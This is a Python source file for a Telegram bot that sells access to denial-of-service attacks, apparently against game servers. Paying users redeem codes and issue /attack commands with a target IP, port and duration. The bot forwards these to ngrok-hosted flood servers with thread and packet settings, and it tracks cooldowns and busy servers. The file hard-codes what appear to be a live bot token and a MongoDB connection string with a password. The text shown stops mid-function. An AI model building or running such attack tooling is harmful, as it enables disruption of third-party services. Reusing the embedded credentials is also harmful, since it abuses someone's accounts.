import os
import logging
import random
import string
import asyncio
import requests
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta, timezone

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7897122394:AAG1nRCkp1UzO0Qmtx5sjrbhUNz_l5-JJGc'
ADMIN_USER_ID = 6556320282  # Replace with the actual admin user ID
LOGGER_GROUP_ID = -1002337550445  # Replace with your actual logger group ID

# MongoDB Configuration
MONGO_URI = "mongodb+srv://VIP:7OMbiO6JV74CFy0I@cluster0.rezah.mongodb.net/VipDatabase?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)
db = client['snajay']
users_collection = db['users']
redeem_codes_collection = db['redeem_codes']

# Cooldown dictionary and URL usage tracking
cooldown_dict = {}
import asyncio
import logging
import os
from datetime import datetime, timezone
from typing import Dict, Optional

ngrok_urls = [
   
   "https://fb88-13-60-206-213.ngrok-free.app",
   "https://b605-13-53-187-254.ngrok-free.app",
    
]

url_usage_dict: Dict[str, Optional[datetime]] = {url: None for url in ngrok_urls}
user_attack_status: Dict[int, bool] = {}  # Track if a user's attack is in progress
cooldown_dict: Dict[int, datetime] = {}

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    logging.info(f'Received /attack command from user {user_id} in chat {chat_id}')

    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    time_mode = context.user_data.get('time_mode', 'default')

    if time_mode == 'default':
        if len(args) != 2:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port>*", parse_mode='Markdown')
            return
        target_ip, target_port = args[0], int(args[1])
        duration = default_duration
    else:
        if len(args) != 3:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Ensure the duration does not exceed the maximum attack duration
        if duration > max_attack_duration:
            await context.bot.send_message(chat_id=chat_id, text=f"*❌ The maximum attack duration is {max_attack_duration} seconds.*", parse_mode='Markdown')
            return

    # Check if the port is blocked
    if target_port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
        return

    # Check if the combination of IP and port exists in the file for the requested date
    file_path = "ip_port_combinations.txt"
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            combinations = file.readlines()
            for line in combinations:
                ip, port = line.strip().split(":")
                if ip == target_ip and int(port) == target_port:
                    await context.bot.send_message(chat_id=chat_id, text="*❌ This IP and port combination has already been attacked today!*", parse_mode='Markdown')
                    await log_interaction(
                        context,
                        f"⚠️ *Attack Blocked*\n"
                        f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
                        f"📄 *Details:* Attempted attack on already attacked combination IP: {target_ip}, Port: {target_port}.",
                        update
                    )
                    return

    # Check cooldown
    current_time = datetime.now(timezone.utc)
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ You need to wait {remaining_time} seconds before launching another attack!*",
                parse_mode='Markdown'
            )
            await log_interaction(
                context,
                f"⏳ *Cooldown Active*\n"
                f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
                f"📄 *Details:* User attempted attack during cooldown period. Remaining time: {remaining_time} seconds.",
                update
            )
            return

    # Check if the user has any requests currently being processed
    if user_id in user_attack_status and user_attack_status[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Your previous attack request is still in progress. Please wait until it completes.*", parse_mode='Markdown')
        return

    # Find a free ngrok URL
    free_ngrok_url = None
    for ngrok_url in ngrok_urls:
        if url_usage_dict[ngrok_url] is None or (datetime.now(timezone.utc) - url_usage_dict[ngrok_url]).total_seconds() > duration:
            free_ngrok_url = ngrok_url
            break

    if not free_ngrok_url:
        await context.bot.send_message(chat_id=chat_id, text="*❌ All servers are currently busy. Please try again later.*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"🚫 *All URLs Busy*\n"
            f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
            f"📄 *Details:* All ngrok URLs are currently busy. User requested attack could not be processed.",
            update
        )
        return

    # Mark the URL as in use
    url_usage_dict[free_ngrok_url] = datetime.now(timezone.utc)
    user_attack_status[user_id] = True  # Mark user's attack as in progress

    # Launch the attack asynchronously
    asyncio.create_task(launch_attack(update, context, free_ngrok_url, target_ip, target_port, duration, user_id, full_name, username))

async def launch_attack(update, context, ngrok_url, target_ip, target_port, duration, user_id, full_name, username):
    chat_id = update.effective_chat.id
    try:
        url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packet_size={packet_size}&thread={thread}"
        headers = {"ngrok-skip-browser-warning": "any_value"}
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            logging.info(f"Attack command sent successfully: {url}")
            logging.info(f"Response: {response.json()}")

            # Log the attack initiation
            await log_interaction(
                context,
                f"⚔️ *Attack Initiated*\n"
                f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
                f"📄 *Details:* Attack initiated on IP: {target_ip}, Port: {target_port}, Duration: {duration} seconds.",
                update
            )

            # Send attack initiation message
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"*⚔️ Attack Launched! ⚔️*\n"
                    f"*🎯 Target: {target_ip}:{target_port}*\n"
                    f"*🕒 Duration: {duration} seconds*\n"
                    f"*🔥 Let the battlefield ignite! 💥*"
                ),
                parse_mode='Markdown'
            )

            # Save the IP and port combination to the file
            file_path = "ip_port_combinations.txt"
            with open(file_path, "a") as file:
                file.write(f"{target_ip}:{target_port}\n")

            # Update the last attack time
            cooldown_dict[user_id] = datetime.now(timezone.utc)

            # Wait for the attack duration
            await asyncio.sleep(duration)

            # Mark the URL as free
            url_usage_dict[ngrok_url] = None
            user_attack_status[user_id] = False  # Mark user's attack as completed

            # Send attack finished message
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"*🎯 Attack Finished!*\n"
                    f"*Target:* `{target_ip}:{target_port}`\n"
                    f"*Duration:* `{duration}` seconds\n"
                    f"*Status:* Completed ✅"
                ),
                parse_mode='Markdown'
            )

            # Log the attack completion
            await log_interaction(
                context,
                f"✅ *Attack Completed*\n"
                f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
                f"📄 *Details:* User's attack on {target_ip}:{target_port} completed.",
                update
            )
        else:
            logging.error(f"Failed to send attack command. Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
            url_usage_dict[ngrok_url] = None  # Mark this URL as free
            user_attack_status[user_id] = False  # Mark user's attack as failed

    except Exception as e:
        logging.error(f"Failed to execute command with {ngrok_url}: {e}")
        url_usage_dict[ngrok_url] = None  # Mark this URL as free
        user_attack_status[user_id] = False  # Mark user's attack as failed
# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Default packet size, thread, duration, max attack time, and cooldown period
packet_size = 7
thread = 900
default_duration = 240
max_attack_duration = 600  # Define max attack time
cooldown_period = 60  # Cooldown period in seconds

# Modified log_interaction function with detailed logging and emojis
async def log_interaction(context, message, update):
    user = update.effective_user
    chat = update.effective_chat
    detailed_message = (
        f"👤 *User:* {user.full_name} (Username: @{user.username}, User ID: {user.id})\n"
        f"💬 *Chat:* {chat.title if chat.title else 'Private Chat'} (Chat ID: {chat.id})\n"
        f"📄 *Details:* {message}"
    )
    await context.bot.send_message(chat_id=LOGGER_GROUP_ID, text=detailed_message, parse_mode='Markdown')

# Function to check if a user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({
        'user_id': user_id,
        'expiration_date': {'$gt': datetime.now(timezone.utc)}
    })
    return user is not None

# Function to approve a user
def approve_user(user_id, duration, unit):
    if unit == 'days':
        expiration_date = datetime.now(timezone.utc) + timedelta(days=duration)
    elif unit == 'hours':
        expiration_date = datetime.now(timezone.utc) + timedelta(hours=duration)
    elif unit == 'minutes':
        expiration_date = datetime.now(timezone.utc) + timedelta(minutes=duration)
    else:
        raise ValueError('Invalid time unit. Use "days", "hours", or "minutes".')

    users_collection.update_one(
        {'user_id': user_id},
        {
            '$set': {
                'user_id': user_id,
                'expiration_date': expiration_date,
                'approved_at': datetime.now(timezone.utc)
            }
        },
        upsert=True
    )

# Function to remove a user
async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    request_user_id = update.effective_user.id

    # Check if the user is the admin
    if request_user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can remove users!*", parse_mode='Markdown')
        return

    # Extract the user ID to be removed from the command arguments
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    remove_user_id = int(context.args[0])

    # Remove the user from the database
    result = users_collection.delete_one({'user_id': remove_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {remove_user_id} has been removed.*", parse_mode='Markdown')
        await log_interaction(context, f"Admin {request_user_id} removed user {remove_user_id}.", update)
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {remove_user_id} not found.*", parse_mode='Markdown')
        # Function to start the bot
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name
    logging.info(f'Received /start command in chat {chat_id}')

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    # Log the user interaction
    await log_interaction(
        context,
        f"🚀 *Start Command*\n"
        f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
        f"📄 *Details:* User started the bot.",
        update
    )

    # Send initial information message
    await context.bot.send_message(chat_id=chat_id, text=(
        "Welcome! You can launch attacks with this bot.\n"
        "You can choose between default time (240 seconds) or customizable time.\n"
        "Use the buttons below to select your preferred option.\n"
        "If you select the wrong option, use /time to change it."
    ), parse_mode='Markdown')

    # Send inline buttons
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)


# Function to approve a user
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    logging.info(f'Received /approve command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can approve users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <duration> <unit>*", parse_mode='Markdown')
        return

    approve_user_id = int(args[0])
    duration = int(args[1])
    unit = args[2]

    try:
        approve_user(approve_user_id, duration, unit)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {approve_user_id} approved for {duration} {unit}!*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"✅ *User Approved*\n"
            f"👤 *Admin:* {full_name} (Username: @{username}, User ID: {user_id})\n"
            f"📄 *Details:* Approved user {approve_user_id} for {duration} {unit}.",
            update
        )
    except ValueError as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ {str(e)}*", parse_mode='Markdown')

# Function to generate redeem codes
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return

    # Default values
    max_uses = 1
    custom_code = None

    # Determine if the first argument is a time value or custom code
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        # First argument is time, generate a random code
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        # First argument is custom code
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    # Check if a time value was provided
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    # Calculate expiration time
    if time_input[-1].lower() == 'd':  # Days
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':  # Minutes
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"

    # Set max_uses if provided
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return

    # Insert the redeem code with expiration and usage limits
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],  # Track user IDs that redeem the code
        "max_uses": max_uses,
        "redeem_count": 0
    })

    # Format the message
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    
    # Send the message with the code in monospace
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )
    await log_interaction(
        context,
        f"🔑 *Redeem Code Generated*\n"
        f"👤 *Admin:* {update.effective_user.full_name} (Username: @{update.effective_user.username}, User ID: {user_id})\n"
        f"📄 *Details:* Generated redeem code `{redeem_code}` with expiry {expiry_label} and max uses {max_uses}.",
        update
    )

# Function to redeem a code with a limited number of uses
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness

    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiration_date": expiry_date}},
        upsert=True
    )

    # Mark the redeem code as used by adding user to `used_by`, incrementing `redeem_count`
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')
    await log_interaction(
        context,
        f"🔑 *Redeem Code Used*\n"
        f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
        f"📄 *Details:* User redeemed code `{code}`.",
        update
    )
    # Function to list all ngrok URLs
async def list_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    ngrok_list = "\n".join(ngrok_urls)

    await context.bot.send_message(chat_id=chat_id, text=f"*Current ngrok URLs:*\n{ngrok_list}", parse_mode='Markdown')
    await log_interaction(
        context,
        f"🔗 *List ngrok URLs*\n"
        f"👤 *Admin:* {user_id}\n"
        f"📄 *Details:* Admin listed ngrok URLs.",
        update
    )

# Function to add a new ngrok URL
async def add_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /addngrok <ngrok_url>*", parse_mode='Markdown')
        return

    ngrok_url = context.args[0]
    if ngrok_url in ngrok_urls:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ This ngrok URL is already in the list.*", parse_mode='Markdown')
        return

    ngrok_urls.append(ngrok_url)
    url_usage_dict[ngrok_url] = None

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ngrok URL added: {ngrok_url}*", parse_mode='Markdown')
    await log_interaction(
        context,
        f"➕ *Add ngrok URL*\n"
        f"👤 *Admin:* {user_id}\n"
        f"📄 *Details:* Added ngrok URL: {ngrok_url}.",
        update
    )

# Function to remove an existing ngrok URL
async def remove_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /removengrok <ngrok_url>*", parse_mode='Markdown')
        return

    ngrok_url = context.args[0]
    if ngrok_url not in ngrok_urls:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ This ngrok URL is not in the list.*", parse_mode='Markdown')
        return

    ngrok_urls.remove(ngrok_url)
    del url_usage_dict[ngrok_url]

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ngrok URL removed: {ngrok_url}*", parse_mode='Markdown')
    await log_interaction(
        context,
        f"➖ *Remove ngrok URL*\n"
        f"👤 *Admin:* {user_id}\n"
        f"📄 *Details:* Removed ngrok URL: {ngrok_url}.",
        update
    )

# Function to show current configuration
async def show_config(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    config_text = (
        f"*Current Configuration:*\n"
        f"📦 *Packet Size:* {packet_size}\n"
        f"🧵 *Thread:* {thread}\n"
        f"⏳ *Default Duration:* {default_duration} seconds\n"
        f"⏳ *Max Attack Duration:* {max_attack_duration} seconds\n"
        f"⏳ *Cooldown Period:* {cooldown_period} seconds\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=config_text, parse_mode='Markdown')
    await log_interaction(
        context,
        f"🔧 *Configuration Viewed*\n"
        f"👤 *Admin:* {user_id}\n"
        f"📄 *Details:* Admin viewed current configuration.",
        update
    )

# Function to update configuration
async def update_config(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'packet_size'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new packet size:*", parse_mode='Markdown')
    await log_interaction(
        context,
        f"🔧 *Configuration Update Started*\n"
        f"👤 *Admin:* {user_id}\n"
        f"📄 *Details:* Admin started updating configuration.",
        update
    )

async def handle_setting(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if 'setting' not in context.user_data:
        return

    setting = context.user_data['setting']
    value = update.message.text

    global packet_size, thread, default_duration, max_attack_duration, cooldown_period

    if setting == 'packet_size':
        packet_size = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Packet size updated to {packet_size}*", parse_mode='Markdown')
        context.user_data['setting'] = 'thread'
        await context.bot.send_message(chat_id=chat_id, text="*Please enter the new thread count:*", parse_mode='Markdown')
    elif setting == 'thread':
        thread = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Thread count updated to {thread}*", parse_mode='Markdown')
        context.user_data['setting'] = 'default_duration'
        await context.bot.send_message(chat_id=chat_id, text="*Please enter the new default duration (seconds):*", parse_mode='Markdown')
    elif setting == 'default_duration':
        default_duration = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Default duration updated to {default_duration} seconds*", parse_mode='Markdown')
        context.user_data['setting'] = 'max_attack_duration'
        await context.bot.send_message(chat_id=chat_id, text="*Please enter the new max attack duration (seconds):*", parse_mode='Markdown')
    elif setting == 'max_attack_duration':
        max_attack_duration = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Max attack duration updated to {max_attack_duration} seconds*", parse_mode='Markdown')
        context.user_data['setting'] = 'cooldown_period'
        await context.bot.send_message(chat_id=chat_id, text="*Please enter the new cooldown period (seconds):*", parse_mode='Markdown')
    elif setting == 'cooldown_period':
        cooldown_period = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Cooldown period updated to {cooldown_period} seconds*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"🔧 *Configuration Updated*\n"
            f"👤 *Admin:* {user_id}\n"
            f"📄 *Details:* Configuration updated: packet_size={packet_size}, thread={thread}, default_duration={default_duration}, max_attack_duration={max_attack_duration}, cooldown_period={cooldown_period}.",
            update
        )
        del context.user_data['setting']
        # Function to cleanup expired users
async def cleanup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is an admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Get the current time
    current_time = datetime.now(timezone.utc)

    # Find and remove expired users
    expired_users = users_collection.find({"expiration_date": {"$lt": current_time}})
    expired_users_list = list(expired_users)
    for user in expired_users_list:
        users_collection.delete_one({"user_id": user["user_id"]})

    # Send a message confirming the cleanup
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')
    await log_interaction(
        context,
        f"🧹 *Expired Users Cleanup*\n"
        f"👤 *Admin:* {update.effective_user.full_name} (Username: @{update.effective_user.username}, User ID: {user_id})\n"
        f"📄 *Details:* Cleaned up {len(expired_users_list)} expired users.",
        update
    )

# Function for handling time settings
async def time_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    # Send initial information message
    await context.bot.send_message(chat_id=chat_id, text=(
        "You can choose between default time (240 seconds) or customizable time.\n"
        "Use the buttons below to select your preferred option.\n"
        "If you select the wrong option, use /time to change it."
    ), parse_mode='Markdown')

    # Send inline buttons
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)
    await log_interaction(
        context,
        f"🕒 *Time Setting Selection*\n"
        f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
        f"📄 *Details:* User initiated time setting selection.",
        update
    )

# Function to provide help information
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    if user_id == ADMIN_USER_ID:
        help_text = (
            "*🔧 Admin Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack\n"
            "/approve <user_id> <duration> <unit> - Approve a user for a specified duration and unit\n"
            "/remove <user_id> - Remove a user\n"
            "/users - Show all users, indicating active and expired users\n"
            "/config - Show current configuration values\n"
            "/updateconfig - Update configuration values\n"
            "/gen <custom_code> <days/minutes> <max_uses> - Generate a redeem code\n"
            "/redeem <code> - Redeem a code\n"
            "/deletecode <code> - Delete a specific redeem code\n"
            "/listcodes - List all redeem codes\n"
            "/cleanup - Cleanup expired users\n"
            "/listngrok - List all ngrok URLs\n"
            "/addngrok <ngrok_url> - Add a new ngrok URL\n"
            "/removengrok <ngrok_url> - Remove an existing ngrok URL\n"
            "/help - Show this help message\n"
        )
    else:
        help_text = (
            "*👥 User Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack (if authorized)\n"
            "/redeem <code> - Redeem a code\n"
            "/help - Show this help message\n"
        )

    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown')
    await log_interaction(
        context,
        f"❓ *Help Command*\n"
        f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
        f"📄 *Details:* User requested help.",
        update
    )
async def show_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    request_user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    # Check if the user is the admin
    if request_user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    users = users_collection.find()
    active_users = []
    expired_users = []

    current_time = datetime.now(timezone.utc)

    for user in users:
        try:
            user_id = user['user_id']
            expiration_date = user.get('expiration_date')

            if expiration_date:
                # Ensure expiration_date is timezone-aware
                if expiration_date.tzinfo is None:
                    expiration_date = expiration_date.replace(tzinfo=timezone.utc)

                time_remaining = expiration_date - current_time
                days, seconds = time_remaining.days, time_remaining.seconds
                hours = seconds // 3600
                minutes = (seconds // 60) % 60

                if expiration_date > current_time:
                    active_users.append((user_id, days, hours, minutes))
                else:
                    expired_users.append((user_id, 0, 0, 0))
        except KeyError as e:
            logging.error(f"Missing key in user document: {e}")
            continue

    active_users_list = "\n".join([f"🟢 User ID: {user_id} (Expires in: {days}D-{hours}H-{minutes}M)" for user_id, days, hours, minutes in active_users])
    expired_users_list = "\n".join([f"🔴 User ID: {user_id} (Expired)" for user_id, _, _, _ in expired_users])

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*Approved Users:*\n"
            f"{active_users_list if active_users_list else 'No active users.'}\n\n"
            "*Expired Users:*\n"
            f"{expired_users_list if expired_users_list else 'No expired users.'}"
        ),
        parse_mode='Markdown'
    )
    await log_interaction(
        context,
        f"👥 *Users Viewed*\n"
        f"👤 *Admin:* {full_name} (Username: @{username}, User ID: {request_user_id})\n"
        f"📄 *Details:* Viewed users: {len(active_users)} active, {len(expired_users)} expired.",
        update
    )
    # Function to delete a specific redeem code
async def delete_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    request_user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    # Check if the user is the admin
    if request_user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can delete codes!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /deletecode <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    result = redeem_codes_collection.delete_one({"code": code})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Redeem code {code} has been deleted.*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"🗑️ *Redeem Code Deleted*\n"
            f"👤 *Admin:* {full_name} (Username: @{username}, User ID: {request_user_id})\n"
            f"📄 *Details:* Deleted redeem code {code}.",
            update
        )
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Redeem code {code} not found.*", parse_mode='Markdown')
        # Function to list all redeem codes
async def list_codes(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    request_user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    # Check if the user is the admin
    if request_user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    codes = redeem_codes_collection.find()
    code_list = []

    for code in codes:
        code_text = (
            f"🔑 Code: {code['code']}\n"
            f"⏳ Expiry Date: {code['expiry_date']}\n"
            f"🔄 Max Uses: {code['max_uses']}\n"
            f"✅ Used: {code['redeem_count']} times\n"
            f"👥 Users: {', '.join(map(str, code['used_by'])) if code['used_by'] else 'None'}\n"
        )
        code_list.append(code_text)

    message = "\n\n".join(code_list) if code_list else "No redeem codes found."

    await context.bot.send_message(chat_id=chat_id, text=f"*Redeem Codes:*\n\n{message}", parse_mode='Markdown')
    await log_interaction(
        context,
        f"📜 *List Redeem Codes*\n"
